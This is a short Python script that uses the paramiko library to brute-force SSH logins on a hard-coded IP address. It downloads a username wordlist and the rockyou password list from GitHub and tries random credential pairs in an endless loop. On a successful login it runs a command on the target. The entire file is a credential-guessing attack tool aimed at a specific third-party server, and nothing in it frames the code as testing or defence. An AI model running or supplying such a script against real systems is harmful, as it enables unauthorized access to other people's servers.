import paramiko
import random
import requests

host = "95.216.66.105"
port = 22
usernames = requests.get("https://github.com/jeanphorn/wordlist/raw/master/usernames.txt")
passwords = requests.get("https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt")

command = "ls"

while True:
    username = random.choice(usernames.text.split("\n"))
    password = random.choice(passwords.text.split("\n"))
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(host, port, username, password)
    stdin, stdout, stderr = ssh.exec_command(command)
    lines = stdout.readlines()
    print(lines)
